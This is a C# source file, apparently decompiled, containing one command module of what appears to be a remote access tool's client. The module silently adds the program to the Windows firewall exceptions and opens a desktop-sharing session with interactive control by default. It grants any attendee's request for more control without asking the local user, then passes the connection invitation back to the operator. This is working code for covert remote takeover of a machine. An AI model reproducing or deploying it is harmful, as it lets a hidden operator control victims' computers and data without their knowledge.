using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Threading;
using NetLib;
using RDPCOMAPILib;
using SharedLib.Commands;
using SharedLib.Dispatcher;

namespace Client.Operations.Management;

public class RDPSessionOp : IOperationBase
{
	[ComImport]
	[Guid("9B78F0E6-3E05-4A5B-B2E8-E743A8956B65")]
	public class SharingSession
	{
	}

	private SharingSession INTERFACE_CLASS;

	private IRDPSRAPISharingSession SESSION;

	private _IRDPSessionEvents_Event EVENTS_SESSION;

	private CTRL_LEVEL CTRL_LEVEL = CTRL_LEVEL.CTRL_LEVEL_VIEW;

	private readonly object _SYN_LOCK = new object();

	public RDPSessionOp(IDispatcherCommand cmd)
		: base(cmd)
	{
	}

	public override void Execute()
	{
		try
		{
			try
			{
				if (FireWall.IsEnabled && !FireWall.IsCurrentAdded())
				{
					FireWall.AddCurrentToExceptions();
				}
			}
			catch (COMException)
			{
			}
			if (!TryGetParameterAt<IDictionary<string, object>>(1, out var parameter))
			{
				parameter = new Dictionary<string, object>();
			}
			if (!TryGetParameterAt<string>(2, out var parameter2))
			{
				parameter2 = "DEFAULT_CONNECTION";
			}
			if (!TryGetParameterAt<string>(3, out var parameter3))
			{
				parameter3 = "DEFAULT_GROUP";
			}
			if (!TryGetParameterAt<string>(4, out var parameter4))
			{
				parameter4 = string.Empty;
			}
			if (!TryGetParameterAt<CTRL_LEVEL>(5, out CTRL_LEVEL))
			{
				CTRL_LEVEL = CTRL_LEVEL.CTRL_LEVEL_INTERACTIVE;
			}
			if (!TryGetParameterAt<int>(6, out var parameter5))
			{
				parameter5 = 1;
			}
			INTERFACE_CLASS = new SharingSession();
			SESSION = INTERFACE_CLASS as IRDPSRAPISharingSession;
			foreach (KeyValuePair<string, object> item in parameter)
			{
				SESSION.Properties[item.Key] = item.Value;
			}
			EVENTS_SESSION = INTERFACE_CLASS as _IRDPSessionEvents_Event;
			new ComAwareEventInfo(typeof(_IRDPSessionEvents_Event), "OnAttendeeConnected").AddEventHandler(EVENTS_SESSION, new _IRDPSessionEvents_OnAttendeeConnectedEventHandler(OnAttendeeConnected));
			new ComAwareEventInfo(typeof(_IRDPSessionEvents_Event), "OnControlLevelChangeRequest").AddEventHandler(EVENTS_SESSION, new _IRDPSessionEvents_OnControlLevelChangeRequestEventHandler(OnControlLevelChangeRequest));
			SESSION.Open();
			string connectionString = SESSION.Invitations.CreateInvitation(parameter2, parameter3, parameter4, parameter5).ConnectionString;
			RaiseStarted(connectionString);
		}
		catch (COMException ex2)
		{
			RaiseFailed(ex2);
		}
	}

	public override void Release()
	{
		try
		{
			Monitor.Enter(_SYN_LOCK);
			if (EVENTS_SESSION != null)
			{
				new ComAwareEventInfo(typeof(_IRDPSessionEvents_Event), "OnAttendeeConnected").RemoveEventHandler(EVENTS_SESSION, new _IRDPSessionEvents_OnAttendeeConnectedEventHandler(OnAttendeeConnected));
				new ComAwareEventInfo(typeof(_IRDPSessionEvents_Event), "OnControlLevelChangeRequest").RemoveEventHandler(EVENTS_SESSION, new _IRDPSessionEvents_OnControlLevelChangeRequestEventHandler(OnControlLevelChangeRequest));
			}
			if (SESSION != null)
			{
				SESSION.Close();
			}
			if (INTERFACE_CLASS != null)
			{
				Marshal.ReleaseComObject(INTERFACE_CLASS);
			}
		}
		catch (Exception ex)
		{
			RaiseFailed(ex);
		}
		finally
		{
			Monitor.Exit(_SYN_LOCK);
		}
		base.Release();
	}

	private void OnAttendeeConnected(object pAttendee)
	{
		((IRDPSRAPIAttendee)pAttendee).ControlLevel = CTRL_LEVEL;
	}

	private void OnControlLevelChangeRequest(object pAttendee, [ComAliasName("RDPCOMAPILib.CTRL_LEVEL")] CTRL_LEVEL RequestedLevel)
	{
		((IRDPSRAPIAttendee)pAttendee).ControlLevel = RequestedLevel;
	}
}
